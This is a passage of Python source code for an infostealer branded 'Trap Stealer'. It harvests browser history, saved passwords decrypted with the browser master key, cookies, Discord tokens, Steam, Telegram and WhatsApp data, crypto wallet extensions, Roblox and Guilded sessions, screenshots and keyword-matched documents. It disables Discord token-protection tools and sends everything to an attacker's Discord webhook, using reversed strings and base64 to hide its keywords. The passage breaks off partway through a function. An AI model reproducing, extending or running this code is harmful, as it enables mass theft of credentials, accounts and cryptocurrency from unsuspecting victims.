        "Opera GX": find_operagx_history_file,
        "Firefox": find_firefox_history_file,
        "Opera": find_opera_history_file,
        "Safari": find_safari_history_file,
        "Internet Explorer": find_ie_history_file,
        "Safari Technology Preview": find_safari_technology_preview_history_file,
    }

    threads = []
    temp_dir = tempfile.mkdtemp()
    files_to_zip = []
    try:
        get_brave_history(temp_dir, files_to_zip)
    except Exception as e:
        error_Handler(e)
    try:
        for browser_name, find_history_func in browsers.items():
            thread = threading.Thread(target=extract_history_with_timeout, args=(browser_name, find_history_func, temp_dir, files_to_zip))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        if files_to_zip:
            zip_file_name = os.path.join(os.path.expandvars('%temp%'), 'browser.zip')
            with zipfile.ZipFile(zip_file_name, 'w') as zipf:
                for file_to_zip in files_to_zip:
                    if os.path.exists(file_to_zip):
                        zipf.write(file_to_zip, os.path.basename(file_to_zip))
                        os.remove(file_to_zip)

    finally:
        for file_to_delete in files_to_zip:
            if os.path.exists(file_to_delete):
                os.remove(file_to_delete)
        
def histup():
    try:
        brohist()
        zip_file_name = os.path.join(os.path.expandvars('%temp%'), "browser.zip")
        if logfile == True:
            move_file_to_temp_folder(zip_file_name)
            return
        
        yrk = upload_file(zip_file_name)
        data = {
            
            "username": "Trap Stealer",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": "🍪 Trap Stealer History",
                    "description": f"Browser History File\n{yrk}",
                    "color": 0xffb6c1,
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        
    except Exception as e:
        error_Handler(e)
Tokqs = []
def getTokq(path, arg):
    try:
        if not os.path.exists(path):
            return

        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                        for Tokq in re.findall(regex, line):
                            global Tokqs
                            if checkTokq(Tokq) == True:
                                if not Tokq in Tokqs:
                                    Tokqs += Tokq
                                    uploadTokq(Tokq, path)
    except Exception as e:
        error_Handler(e)
def GetDiscord(path, arg):
    try:
        if not os.path.exists(f"{path}/Local State"): return

        pathC = path + arg

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotected(master_key[5:])
        
        for file in os.listdir(pathC):
            if file.endswith(".log") or file.endswith(".ldb"):
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokqs
                        TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkTokq(TokqDecoded):
                            if not TokqDecoded in Tokqs:
                                Tokqs += TokqDecoded
                                uploadTokq(TokqDecoded, path)
    except Exception as e:
        error_Handler(e)


                
paswWords = []
Passw = []

def getPassw(path, arg, process):

    try:

        def DecryptValue(Buffer, master_key=None):
            starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
            if starts == 'v10' or starts == 'v11':
                iv = Buffer[3:15]
                payload = Buffer[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16]
                try: decrypted_pass = decrypted_pass.decode()
                except Exception as e:
                    error_Handler(e)
                return decrypted_pass
        global Passw, PasswCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)
        Os_Cr = 'tpyrc_so'
        Encrypt_Key = 'yek_detpyrcne'
        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state[Os_Cr[::-1]][Encrypt_Key[::-1]])
        master_key = CryptUnprotected(master_key[5:])

        for row in data: 
            if row[0] != '':
                User = 'emanresU'
                Url = 'lrU'
                Passw.append(f"{Url[::-1]}: {row[0]} | {User[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
                PasswCount += 1
        writeforfile(Passw, 'passw')
    except Exception as e:
        error_Handler(e)
    
def getinfo():
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            sysinfo_future = executor.submit(systemInfo)
            globalinfo_future = executor.submit(globalInfo)
            clipboardtext_future = executor.submit(clip)
            useri = executor.submit(UserInfo)

            sysinfo = sysinfo_future.result()
            globalinfo = globalinfo_future.result()
            clipboardtext = clipboardtext_future.result()
            useri = useri.result()

            data = {
                "username": "Trap Stealer",
                "content": "@everyone someone launched it",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "embeds": [
                    {
                        "title": "🍪 Trap Stealer Information",
                        "description": f"{globalinfo}\n\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : `{StartupMessage}`\nMore Info : `Info.txt` \n[Click here to download]({useri})\nClipboard text : ```{clipboardtext}```",
                        "color": 0xffb6c1,
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "footer": {
                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        }
                    }
                ]
            }
            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except Exception as e:
        error_Handler(e)


def steam_st():
    try:
        steam_path = ""
        if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
            steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
            ssfn = []
            config = ""
            for file in os.listdir(steam_path):
                if file[:4] == "ssfn":
                    ssfn.append(steam_path+f"\\{file}")
            def steam(path,path1,steam_session):
                for root,dirs,file_name in os.walk(path):
                    for file in file_name:
                        steam_session.write(root+"\\"+file)
                for file2 in path1:
                    steam_session.write(file2)
            if os.path.exists(steam_path+"\\config"):
                with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                    steam(steam_path+"\\config",ssfn,zp)
                
                if logfile == True:
                    move_file_to_temp_folder(f"{os.environ['TEMP']}\\steam_session.zip")

                headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    } 

            file = {"file": open(f"{os.environ['TEMP']}\\steam_session.zip", "rb")}
            data = {
                "username": "Trap Stealer",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "content": "Here the Steam Session file"
            }

            response = requests.post(webhook, files=file, data=data)
            try:

                os.remove(f"{os.environ['TEMP']}\\steam_session.zip")

            except Exception as e:
                error_Handler(e)
    except Exception as e:
        error_Handler(e)

import concurrent.futures

def upload_files_to_discord():
    keywords = ['enohp', 'noitulfedacilbup', 'gnitirw', 'etisoppa', 'laicion', 'trossap', 'muhtyre', 'tellaw', 'drowssap egarots', 'eciffo laicion', 'tnuocca', 'slavitsef eninapmoc', 'nogin', 'tnuocca knalb', 'drowssap noitcudorp', 'etisoppa laicion', 'etelpmoc laicion', 'dircet tihcrac', 'noitamroproirp', 'emusern', 'laif gnitartsinimda', 'etelpmoc', 'drowssap ycnanif', 'drowssap ytecnanif', 'drowssap decures', 'sserdda', 'ytiruces yrtnuoces laicos', 'ytocryptocurrency', 'drowssap yroirp', 'noitartsinimda', 'tterces', 'niotcib', 'evig', 'liame', 'ytinifidnocnafnoc', 'ipa', 'noitartsinimda reganam']
    extension = 'txt'
    desktop_path = os.path.expanduser("~/Desktop")
    downloads_path = os.path.expanduser("~/Downloads")
    documents_path = os.path.expanduser("~/Documents")

    file_paths = []
    for path in [desktop_path, downloads_path, documents_path]:
        try:
            for file in os.listdir(path):
                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
                    file_path = os.path.join(path, file) 
                    file_paths.append(file_path)
        except Exception as e:
            error_Handler(e)
        urls = []
    
        with concurrent.futures.ThreadPoolExecutor() as executor:
            time.sleep(0.1)
            futures = []
            try:
                for file_path in file_paths:
                    if logfile == True:
                        move_file_to_temp_folder(file_path)
                    futures.append(executor.submit(upload_file, file_path))
                for future, file_path in zip(futures, file_paths):
                    url = future.result()
                    if url:
                        urls.append((os.path.basename(file_path), url))
                    else:
                        pass
            except Exception as e:
                error_Handler(e)
            finally:
                executor.shutdown(wait=True)


    if urls:
        embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]

        data = {
            "username": "Trap Stealer",
            "content": "",
            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
            "embeds": [
                {
                    "title": "🍪 Trap Stealer Files",
                    "description": "New files have been uploaded:",
                    "color": 0xffb6c1,
                    "fields": embed_fields,
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "footer": {
                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    }
                }
            ]
        }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        
     
def bypass_token_protector():
    try:
        roaming_path = os.getenv("appdata")
        tp = Path(roaming_path) / "DiscordTokenProtector"
        config_path = tp / "config.json"

        if not config_path.exists():
            return

        files_to_remove = ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]
        for file_name in files_to_remove:
            (tp / file_name).unlink(missing_ok=True)

        try:
            with config_path.open(errors="ignore") as f:
                try:
                    item = load(f)
                except Exception as e:
                    error_Handler(e)
                    return

            item.update({
                'auto_start': False,
                'auto_start_discord': False,
                'integrity': False,
                'integrity_allowbetterdiscord': False,
                'integrity_checkexecutable': False,
                'integrity_checkhash': False,
                'integrity_checkmodule': False,
                'integrity_checkscripts': False,
                'integrity_checkresource': False,
                'integrity_redownloadhashes': False,
                'iterations_iv': 364,
                'iterations_key': 457,
                'version': 5
            })

            with config_path.open('w') as f:
                dump(item, f, indent=2, sort_keys=True)

        except Exception as e:
            error_Handler(e) 
    except Exception as e:
        error_Handler(e)
    
def list_files_in_directory(directory, level=0, max_display=100):
    file_list = []

    for root, dirs, files in os.walk(directory):
        root_name = os.path.basename(root)
        indent = "    " * level
        truncated_root_name = root_name[:10] + "..." if len(root_name) > 10 else root_name
        folder_line = f"{indent}{'      ╚═' if level == 0 else '    ╠═'}📂 {truncated_root_name}"

        if not os.listdir(root):
            continue

        file_list.append(folder_line)

        num_files = len(files)
        if num_files <= max_display:
            for idx, file in enumerate(files):
                file_path = os.path.join(root, file)
                if os.path.isdir(file_path):
                    folder_line = f"{indent}{'╠═' if level == 0 else '    ╠═'}📂 {file}"
                    if file != truncated_root_name:
                        folder_line = "    " + folder_line
                    file_list.append(folder_line)
                    file_list.extend(list_files_in_directory(file_path, level=level + 1, max_display=max_display))
                else:
                    truncated_file_name = file[:10] + "..." if len(file) > 10 else file
                    file_line = f"{indent}{'    ╠═' if level == 0 else '        ╠═'}📝 {truncated_file_name}"

                    if os.path.isdir(file_path) and any(os.path.isfile(os.path.join(file_path, subfile)) for subfile in os.listdir(file_path)):
                        file_line = file_line.replace("╠", "╚", 1) 

                    if idx == num_files - 1:
                        file_line = file_line.replace("╠", "╚", 1) 

                    if not file_line.startswith("\t"):
                        file_line = "\t" + file_line 

                    file_list.append(file_line)
        else:
            file_list.append(f"{indent}{'   ' if level == 0 else ' '}     ╚═📝 (Too many files to display)")

    file_list[0] = f"╚═📂 5319275A.W..."

    return "\n".join(file_list)

def Get_Whatsapp(base_directory, zip_file_path):
    try:
        all_files = []

        for root, dirs, files in os.walk(base_directory):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isdir(file_path) and not os.listdir(file_path):
                    continue

                all_files.append(file_path)

        num_files = len(all_files)

        if num_files <= 1000:
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_path in all_files:
                    zipf.write(file_path, os.path.relpath(file_path, base_directory))
                    
            if logfile == True:
                move_file_to_temp_folder(zip_file_path) 

            return list_files_in_directory(base_directory, level=0, max_display=10), zip_file_path
        else:
            move_file_to_temp_folder(zip_file_path)
            return "Too many files to display", zip_file_path
    except Exception as e:
        error_Handler(e)
    
def Upload_Whatsapp():
    try:
        x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
        if logfile == True:
            move_file_to_temp_folder(y)
            return
        url = upload_file(y)


        data = {
                "username": "Trap Stealer",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "embeds": [
                    {
                        "title": "🟢 Whatsapp stealer",
                        "description": f"📂Here the directory:\n\n```{x}```",
                        "color": 0xffb6c1,
                        "fields": [
                            {"name": f"WhatsApp file", "value": f"      [Click here to download]({url})"},
                        ],
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "footer": {
                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        }
                    }
                ]
        }

        headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    
    except Exception as e:
        error_Handler(e)
    
def Bypass_Better_Discord():
    try:
        BetterDiscord_Path = os.path.join(os.getenv("appdata"), "BetterDiscord", "data", "betterdiscord.asar")

        with open(BetterDiscord_Path, "r", encoding="cp437") as f:
            content = f.read().replace("api/webhook", "Err: 444")

        with open(BetterDiscord_Path, "w", encoding="cp437") as f:
            f.write(content)
    except Exception as e:
        error_Handler(e)
def close_process(procc):
    if close_proc == True:
        try:
            subprocess.Popen(f'''ta"sk"ki"ll /im {procc} /t /f >nul 2>&1''', shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception as e:
            error_Handler(e)
            return False
        
def ZipTelegram(path, arg, procc):
    try:
        global OtherZip
        pathC = path
        name = arg
        if not os.path.exists(pathC):
            return

        close_process(procc)

        with ZipFile(f"{pathC}/{name}.zip", "w") as zf:
            files = [file for file in os.listdir(pathC) if not (
                ".zip" in file
                or "tdummy" in file
                or "user_data" in file
                or "webview" in file
            )]
            for file in files:
                zf.write(f"{pathC}/{file}")
        if logfile == True:
            move_file_to_temp_folder(f'{pathC}/{name}.zip')
            return
        lnik = upload_file(f'{pathC}/{name}.zip')
        os.remove(f"{pathC}/{name}.zip")
        OtherZip.append([arg, lnik])
    except Exception as e:
        error_Handler(e)
    

        
    

def ZipThings(path, arg, procc):
    try:
        pathC = path
        name = arg

        if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"Metamask_{browser}"
            pathC = os.path.join(path, arg)

        if not os.path.exists(pathC):
            return

        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
        wall = 'tellaW'
        if wall[::-1] in arg or "NationsGlory" in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{browser}"
            
        elif "Steam" in arg:
            loginusers_file = os.path.join(pathC, "loginusers.vdf")
            if not os.path.isfile(loginusers_file):
                return
            with open(loginusers_file, "r", encoding="utf8") as f:
                data = f.read()
                if 'RememberPassword"\t\t"1"' not in data:
                    return
            name = arg

        zf = ZipFile(os.path.join(pathC, f"{name}.zip"), "w")
        for file in os.listdir(pathC):
            if ".zip" not in file:
                zf.write(os.path.join(pathC, file))
        zf.close()

        lnik = upload_file(os.path.join(pathC, f"{name}.zip"))
        os.remove(os.path.join(pathC, f"{name}.zip"))

        if wall[::-1] in arg or "eogaeaoehlef" in arg:
            wltZip.append([name, lnik])
        elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
            GamingZip.append([name, lnik])
        else:
            OtherZip.append([name, lnik])
    except Exception as e:
        error_Handler(e)

def srcs():
    try:

        if os.name == "nt":
            
            image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")
            test = b64decode("LUNvbW1hbmQ=").decode('utf8')
            command = [
                "powershell.exe",
                f"{test}",
                f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{image_folder}\\MyFancyScreenshot.png')"
            ]
            subprocess.run( '-NoProfile', '-ExecutionPolicy', 'Bypass',command)

            screenshot_path = os.path.join(image_folder, "MyFancyScreenshot.png")

            with open(screenshot_path, "rb") as file:
                file_data = file.read()
                data = {
                    "username": "Trap Stealer",
                    "content": "Screen was successfully taken",
                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
                }
                requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})

            os.remove(screenshot_path)

    except Exception as e:
        error_Handler(e)
url_dict = {}
data = []
def paaz(filetype):
    temp = []
    if filetype == 'cook':
        try:
            file = os.getenv("TEMP") + fr"\wpcook.txt"
            filename = "wpcook.txt"
        except:
            file = "Couldn't get cookies"
            filename = 'Error.txt'
        if logfile == True:
            move_file_to_temp_folder(file)
            return
        s = upload_file(file)
        url_dict['cook'] = s
    
        rbx = threading.Thread(target=cokssite)
        rbx.start()
        temp.append(rbx)
        

    if filetype == 'passw':
        try:
            file2 = os.getenv("TEMP") + fr"\wppassw.txt"
        except:
            file2 = "Couldn't get passwords"

        if logfile == True:
            move_file_to_temp_folder(file2)
            return
        ss = upload_file(file2)
        url_dict['passw'] = ss

    if filetype == 'autof':
        try:
            file3 = os.getenv("TEMP") + fr"\wpautofill.txt"
        except:
            file3 = "Couldn't get autofill"
        if logfile == True:
            move_file_to_temp_folder(file3)
            return
        sss = upload_file(file3)
        url_dict['autof'] = sss

    if filetype == 'uploooad':
        try:
            with open(os.getenv("TEMP") + fr"\wpcook.txt", 'r') as fp:
                CookiCount = sum(1 for line in fp)
        except:
            CookiCount = 'error'

        try:
            if logfile == True:
                return
            data = {
                "username": "Trap Stealer",
                "content": "",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "embeds": [
                    {
                        "title": f"🍪 Trap Stealer {'drowssaP'[::-1]} and cookies",
                        "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {Autofill_count}",
                        "color": 0xffb6c1,
                        "fields": [
                            {"name": "wppassw.txt", "value": f"[Click here to download]({url_dict.get('passw', '')})"},
                            {"name": "wpcook.txt", "value": f"[Click here to download]({url_dict.get('cook', '')})"},
                            {"name": "wpautofill.txt", "value": f"[Click here to download]({url_dict.get('autof', '')})"}
                        ],
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "footer": {
                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        }
                    }
                ]
            }

            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        except Exception as e:
            error_Handler(e)
        
        for thread in temp:
            thread.join()
        try:
            file = os.getenv("TEMP") + fr"\wpcook.txt"
            file2 = os.getenv("TEMP") + fr"\wppassw.txt"
            file3 = os.getenv("TEMP") + fr"\wpautofill.txt"
            file4 = os.getenv("TEMP") + fr'\winvs.txt'
            file5 = os.getenv("TEMP") + fr'\winguid.txt'
            ss = [file,file5,file2,file3,file4]
            for file in ss:
                try:
                    os.remove(file)
                except Exception as e:
                    error_Handler(e)

        except Exception as e:
            pass



def frcook():
    try:
        global Cookies, CookiCount
        firefoxpath = f"{roaming}/Mozilla/Firefox/Profiles"
        if not os.path.exists(firefoxpath): return
        subprocess.Popen(f"taskkill /im firefox.exe /t /f >nul 2>&1", shell=True)
        for subdir, dirs, files in os.walk(firefoxpath):
            for file in files:
               if file.endswith("cookies.sqlite"):
                    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
                    shutil.copy2(os.path.join(subdir, file), tempfold)
                    conn = sql_connect(tempfold)
                    cursor = conn.cursor()
                    cursor.execute("select * from moz_cookies ")
                    data = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    os.remove(tempfold)
                    for row in data:
                        if row[0] != '':
                            Cookies.append(f"Host Key: {row[4]} | Name : {row[2]} | Value : {row[3]}")
                            CookiCount += 1
                            
                    file3 = os.getenv("TEMP") + fr"\wpcook.txt"
                    with open(file3, 'a') as f:
                        f.write(Cookies)
                            
    except Exception as e:
        error_Handler(e)

def GetAll(UserID: int) -> list:
    try:
        FullList = []
        response = requests.get(f'https://friends.roblox.com/v1/users/{UserID}/friends')
        Friendslist = loads(response.text)

        if 'data' in Friendslist:
            x = 0
            for friend in Friendslist['data']:
                if x == 3:
                    return FullList
                
                is_banned = friend.get('isBanned', False)
                has_verified_badge = friend.get('hasVerifiedBadge', False)

                banned_status = "❌" if is_banned == False else "✅"
                verified_status = "❌" if has_verified_badge == False else "✅"

                FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
                x += 1
            return FullList
        else:
            raise ValueError("No 'data' key in the response.")
    except Exception as e:
        error_Handler(e)
        return []

def GetRAP(UserID):

    ErroredRAP = 0
    TotalValue = 0
    Cursor = ""
    Done = False
    while(Done == False):
        try:
            response = requests.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}")
            Items = response.json()
            if((response.json()['nextPageCursor'] == "null") or response.json()['nextPageCursor'] == None):
                Done = True
            else:
                Done = False
                Cursor = response.json()['nextPageCursor']
            for Item in Items["data"]:
                try:
                    RAP = int((Item['recentAveragePrice']))
                    TotalValue = TotalValue + RAP
                except:
                    TotalValue = TotalValue
            if(response.json()['nextPageCursor'] == 'None'):
                Done = True
            
        except Exception as ex:
            Done = True
    return(TotalValue)

def roblox(cookie):
    try:
        baseinf = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}).json()
        username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
        
        friendlist = GetAll(userId)
        rap = GetRAP(userId)
        
        if premium == True:
            premium = '✅'
        else:
            premium = '❌'
        if builderclub == True:
            builderclub = '✅'
        else:
            premium = '❌'

        advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
        description = 'No Description'
        if advancedInfo["description"]:
            description = advancedInfo["description"]
        if advancedInfo["description"] == True:
            banned = '✅'
        else: 
            banned = '❌'
        creationDate = advancedInfo["created"]
        creationDate = creationDate.split("T")[0].split("-")
        creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
        creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
        current_timestamp = time.time()
        seconds_passed = current_timestamp - creation_timestamp
        days_passed = round(seconds_passed / (24 * 60 * 60))

        data = {
            "username": "Trap Stealer",
            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
            "content": "",
            "embeds": [
                {
                    "title": f"🍪 Trap Stealer Roblox",
                    "description": f"Cookie Founded ! : `{cookie}`\n",
                    "color": 0xffb6c1,
                    "author": {
                        "name": f"{username} ({userId})\n",
                    },
                    "footer": {
                        "text": "Trap Stealer",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    },
                    "thumbnail": {
                        "url": thumbnail 
                    },
                    "fields": [

                        {
                            "name": "💸 Robux:",
                            "value": robux,
                            "inline": True
                        },
                        {
                            "name": ":ribbon: Premium:",
                            "value": premium,
                            "inline": True
                        },
                        {
                            "name": "📅 Creation Date:",
                            "value": creationDate+ f"\n{days_passed} Days!",
                            "inline": True
                        },
                        {
                            "name": "😋 Account Description:",
                            "value": description,
                            "inline": True
                        },
                        {
                            "name": "🔨 Banned:",
                            "value": banned,
                            "inline": True
                        },
                        {
                            "name": "💰 RAP:",
                            "value": rap,
                            "inline": True
                        },
                        {
                            "name": "🔨 Friends:",
                            "value": "\n".join([f"Display Name: `{friend_info[0]}`(Name: `{friend_info[1]}`)\nBanned:{friend_info[2]},Verified:{friend_info[3]}" for friend_info in friendlist]),
                            "inline": True
                        }
                    ],
                }
            ],
            "attachments": []
        }
        headers= {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        
        character_limit = 1900

        if len(data) > character_limit:
            data = data[:character_limit - 3] + "..."

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except Exception as e:
        error_Handler(e)
def guilded(cookie):
    try:
        urlguild = "https://www.guilded.gg/api/me"
        headersguild = {
        "Cookie": f"hmac_signed_session={cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        response = requests.get(urlguild, headers=headersguild).json()

        try:
            social_links = response["user"]['socialLinks']
            social_links_info = []

            for link in social_links:
                name = link.get('handle', '')
                websitename = link.get('type', 'Cannot get the website')
                url = link.get('additionalInfo', {}).get('profileUrl', 'No Website')

                social_link_info = {
                    "Name": name,
                    "Website": websitename,
                    "URL": url
                }

                social_links_info.append(social_link_info)
        except:
            social_links_info = 'No Connections'
            
        if social_links_info != 'No Connections':
            formatted_social_links = "\n".join([f"📙 {link['Name']}\n🌐 {link['Website']}\n`🔗 {link['URL']}`" for link in social_links_info])
        else:
            formatted_social_links = 'No Connections'


        pfp = response["user"]["profilePicture"] if response["user"]["profilePicture"] else 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
        try:
            pfp.replace('.webp', '.png')
            try:
                pfp.replace('?w=450&h=450&ia=1','')
            except Exception as e:
                error_Handler(e)
        except Exception as e:
            error_Handler(e)
        email = response["user"]["email"] if response["user"]["email"] else 'No Email'
        ids = response["user"]["id"] if response["user"]["id"] else 'Error getting ID'
        globalusername = response["user"]["name"] if response["user"]["name"] else 'No global username'
        username = response["user"]["subdomain"] if response["user"]["subdomain"] else 'No Subdomain (Private Username)'
        join = response["user"]["joinDate"] if response["user"]["joinDate"] else "Couldn't get join date"
        bio = response["user"]["aboutInfo"]["tagLine"] if response["user"]["aboutInfo"]["tagLine"] else "Couldn't get user bio"
        data = {
                "username": "Trap Stealer",
                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
                "content": "",
                "embeds": [
                    {
                        "title": f"🍪 Trap Stealer Guilded Session",
                        "description": f"Founded user information ! :\n",
                        "color": 0xffb6c1,
                        "author": {
                            "name": f"User information :",
                            "icon_url": 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
                        },
                        "footer": {
                            "text": "Trap Stealer",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        },
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "fields": [
                            {
